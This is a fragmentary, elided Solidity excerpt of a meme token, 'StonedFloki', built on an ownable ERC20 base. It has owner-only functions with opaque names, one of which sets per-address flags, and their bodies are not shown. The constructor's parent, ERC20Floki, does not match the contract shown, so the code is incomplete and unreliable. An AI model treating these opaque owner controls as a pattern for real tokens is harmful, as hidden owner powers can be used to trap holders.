...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _jointy(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function CompletelyBaked() external onlyOwner() {
...
contract StonedFlokiV2 is ERC20Floki {
    constructor() ERC20Floki("StonedFloki", "STONED", false, true, 1100, 15, msg.sender, 420000 * 10 ** 18, msg.sender, 2) {
    }
}
